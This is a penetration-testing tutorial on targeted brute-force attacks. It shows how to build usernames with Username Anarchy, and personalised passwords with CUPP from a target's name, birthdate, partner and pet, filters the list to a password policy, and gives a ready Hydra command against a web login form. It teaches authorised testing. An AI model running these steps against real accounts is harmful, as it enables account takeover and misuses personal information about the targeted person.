# Custom Wordlists

This documentation outlines the creation and use of custom wordlists to enhance brute-force attacks, focusing on tools like Username Anarchy and CUPP for tailored username and password generation.

---

## Overview

Pre-made wordlists like `rockyou.txt` and `SecLists` are broad and generalized, often inefficient for specific targets. Custom wordlists, on the other hand, leverage Open-Source Intelligence (OSINT) to generate tailored credentials, increasing the likelihood of successful brute-force attempts.

---

## Username Generation: Username Anarchy

### Installing Username Anarchy

```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```

### Generating Custom Usernames

```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

This generates a diverse set of usernames based on the target's name, including combinations like:
- Basic: `janesmith`, `smithjane`, `j.smith`
- Initials: `js`, `j.s`, `s.j`
- Variants: `j4n3`, `smith87`

Inspect `jane_smith_usernames.txt` to review the generated list.

---

## Password Generation: CUPP

### Installing CUPP

```bash
sudo apt install cupp -y
```

### Running CUPP in Interactive Mode

```bash
cupp -i
```

CUPP will prompt you for information about the target. Provide as much detail as possible, such as:
- Name, nickname, birthdate
- Partner's name, pet's name
- Interests, company name

Example interaction:
```
> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate: 11121990
> Partner's Name: Jim
> Pet's Name: Spot
> Company Name: AHI
> Add special characters? Y
> Add random numbers? Y
> Leet mode? Y
```

CUPP will generate a wordlist, saving it as `jane.txt`.

---

## Filtering Passwords

If the target enforces password policies, filter the generated list using `grep`:

```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

This command:
- Ensures a minimum length of 6 characters.
- Checks for uppercase, lowercase, numbers, and at least two special characters.

The filtered list is saved as `jane-filtered.txt`.

---

## Using Custom Wordlists in Hydra

Combine the username and password lists with Hydra to perform a brute-force attack:

```bash
hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

---

## Summary

1. Use Username Anarchy to generate tailored username lists.
2. Use CUPP to generate personalized password lists.
3. Filter passwords to comply with the target’s policies.
4. Use Hydra with custom lists to perform targeted brute-force attacks.

Custom wordlists maximize efficiency by focusing on specific targets, leveraging personal and organizational information gathered through OSINT.

